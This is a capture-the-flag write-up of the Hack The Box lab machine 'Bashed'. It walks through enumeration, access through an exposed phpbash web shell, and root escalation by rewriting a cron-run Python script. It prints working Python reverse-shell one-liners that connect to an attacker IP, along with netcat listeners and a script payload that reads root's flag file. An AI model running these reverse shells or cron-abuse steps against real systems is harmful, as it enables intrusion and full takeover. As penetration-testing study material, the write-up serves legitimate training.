---
title: HTB Bashed Writeup
date: 2026-08-30 14:00:00 +0400
categories: [HTB, Easy]
tags: [phpbash, web-shell, sudo, cron-exploitation, privilege-escalation, python, reverse-shell]
---

# HTB Bashed — Writeup

**Machine**: Bashed | **OS**: Linux | **Difficulty**: Easy | **IP**: 10.129.73.124

---

## Machine Information

- **Operating System**: Linux (Ubuntu)
- **Web Server**: Apache httpd 2.4.18
- **Primary Service**: Web application with development tools
- **Title**: Arrexel's Development Site

---

## Reconnaissance & Enumeration

### Nmap Scan

Performed comprehensive port scan:

```bash
nmap -sC -sV 10.129.73.124
```

**Scan Results:**

```bash
Nmap scan report for 10.129.73.124
Host is up (0.25s latency)
Not shown: 999 closed tcp ports (conn-refused)

PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

**Key Findings:**
- Only port 80 open (HTTP)
- Apache httpd 2.4.18 running on Ubuntu
- Site titled "Arrexel's Development Site"
- Web application is the primary attack vector

### Directory Enumeration

Used gobuster to discover web directories:

```bash
gobuster dir -u http://10.129.73.124 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

**Gobuster Results:**

```bash
/css                  (Status: 301)
/dev                  (Status: 301) 
/fonts                (Status: 301)
/images               (Status: 301)
/index.html           (Status: 200)
/js                   (Status: 301)
/php                  (Status: 301)
/server-status        (Status: 403)
/uploads              (Status: 301)
```


**Interesting Directories:**
- `/dev` — Development directory containing admin tools
- `/php` — PHP files directory
- `/uploads` — File upload directory

---

## Initial Foothold

### Discovering phpbash.php

Explored the `/dev` directory and found an interactive PHP-based web shell:

http://10.129.73.124/dev/phpbash.php


**phpbash.php** is a web-based bash shell allowing arbitrary command execution through the browser.

### Accessing the Web Shell

Accessed phpbash.php and obtained interactive shell access as www-data:

```bash
www-data@bashed:/var/www/html/dev#
```

### Initial System Enumeration

Listed home directory to identify users:

```bash
ls -l /home
```

**Output:**

```bash
total 8
drwxr-xr-x 4 arrexel      arrexel      4096 Jun  2  2022 arrexel
drwxr-xr-x 3 scriptmanager scriptmanager 4096 Dec  4  2017 scriptmanager
```


### Capturing User Flag

Retrieved user flag:

```bash
ls -l /home/arrexel
```

-r--r--r-- 1 arrexel arrexel 33 Aug 27 12:37 user.txt


```bash
cat /home/arrexel/user.txt
```

**User Flag:**

3197dc36cXXX


---

## Establishing Reverse Shell

### Setting Up Listener

```bash
nc -lvnp 9001
```

### Executing Reverse Shell

From phpbash.php, executed Python reverse shell:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.60",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

**Result:** Reverse shell established as www-data.

---

## Privilege Escalation

### Stage 1: Sudo Enumeration

```bash
sudo -l
```

**Critical Output:**

```bash
Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass,
secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

**www-data can execute ANY command as scriptmanager without a password!**

### Stage 2: Testing Sudo Escalation

```bash
sudo -S -u scriptmanager whoami
```

**Output:**

scriptmanager


### Stage 3: Switching to scriptmanager

```bash
sudo -i -u scriptmanager
```

**Result:**

```bash
scriptmanager@bashed:~$
```

### Stage 4: Discovering /scripts Directory

```bash
ls -l /scripts
```

**Output:**

```bash
total 8
-rw-r--r-- 1 scriptmanager scriptmanager 206 Aug 30 04:07 test.py
-rw-r--r-- 1 root root 12 Aug 30 04:07 test.txt
```

**Key Observations:**
- test.py is writable by scriptmanager
- test.txt is owned by root
- Root owns test.txt, indicating root is executing test.py

### Stage 5: Analyzing test.py

```bash
cat test.py
```

**Script Content:**

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close()
```

### Stage 6: Confirming Automatic Execution

Checked test.txt content:

```bash
cat test.txt
```

**First Check:**

testing 123!


**Second Check:**

```bash
Let's replace ch3 with testing 123 and wait few minutes

scriptmanager@bashed:/scripts$ cat test.txt 
ch3
```

**The content changed!** The script is executing automatically.

### Stage 7: Checking Crontabs

```bash
crontab -l
```

**Output:**

no crontab for scriptmanager


---

## Exploiting Cron Job for Root Access

### Path 1: Reading Root Flag via Modified Script

**Step 1: Test whoami as root**

```bash
cat > test.py << 'EOF'
import os
f = open("test.txt", "w")
f.write(os.popen("whoami").read())
f.close()
EOF
```

Waited for automatic execution:

```bash
cat test.txt
```

**Output:**

root


**Confirmed: Script executes as root!**

**Step 2: Read Root Flag**

```bash
cat > test.py << 'EOF'
import os
f = open("test.txt", "w")
f.write(os.popen("cat /root/root.txt").read())
f.close()
EOF
```

Waited for cron execution:

```bash
cat test.txt
```

**Root Flag:**

de18ba445ea7XXX


### Path 2: Interactive Root Shell

**Step 1: Set Up New Listener**

```bash
nc -lvnp 5566
```

**Step 2: Modify test.py for Reverse Shell**

```bash
cat > test.py << 'EOF'
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
EOF
```

**Step 3: Wait for Automatic Execution**

**Listener Output:**

Listening on 0.0.0.0 5566
Connection received on 10.129.75.76 48480


**Received root reverse shell!**

**Step 4: Verify Root Access**

```bash
id
```

**Output:**

uid=0(root) gid=0(root) groups=0(root)


### Stage 8: Discovering Root's Crontab

```bash
crontab -l
```

**Critical Discovery:**
cd /scripts; for f in *.py; do python "$f"; done

**This is the vulnerability!** Root's crontab:
- Runs every minute (`* * * * *`)
- Executes ALL Python files in /scripts with root privileges

---

## Summary & Key Takeaways

### Attack Chain

1. **Nmap Scan** → Found Apache httpd 2.4.18 on port 80
2. **Directory Enumeration** → Discovered /dev directory
3. **phpbash.php** → Found interactive web shell
4. **Initial Access** → Obtained www-data shell
5. **User Flag** → Captured from /home/arrexel/user.txt
6. **Reverse Shell** → Established Python shell for better access
7. **Sudo Enumeration** → Found NOPASSWD to scriptmanager
8. **Script Discovery** → Found writable test.py in /scripts
9. **Cron Detection** → Identified automatic execution
10. **Root Exploitation** → Modified test.py to execute as root
11. **Root Access** → Captured root flag and interactive shell
12. **Crontab Analysis** → Confirmed wildcard execution pattern

### Key Vulnerabilities

- **phpbash.php** — Web shell exposed in /dev directory
- **Sudo NOPASSWD** — www-data executes ANY command as scriptmanager without password
- **Writable Script** — test.py writable by scriptmanager but executed by root
- **Root Crontab** — Executes all .py files every minute in /scripts
- **Wildcard Execution** — `*.py` pattern executes any Python file

### Tools Used

- `nmap` — Port scanning
- `gobuster` — Directory enumeration
- Browser — Accessing phpbash.php
- `nc (netcat)` — Reverse shell listener
- `python` — Reverse shell and script execution
- Standard Linux commands

### Lessons Learned

- Development tools like phpbash.php should never be in production
- sudo NOPASSWD is a critical escalation risk
- Writable scripts executed by root = instant root access
- Cron jobs with wildcard patterns are dangerous
- Automatic execution every 60 seconds provides reliable exploitation
- Multiple chained vulnerabilities = complete compromise

---

## Flags

- 🚩 **User Flag**: 3197dc36cXXX
- 🚩 **Root Flag**: de18ba445ea7XXX

**Machine: Completed ✓**
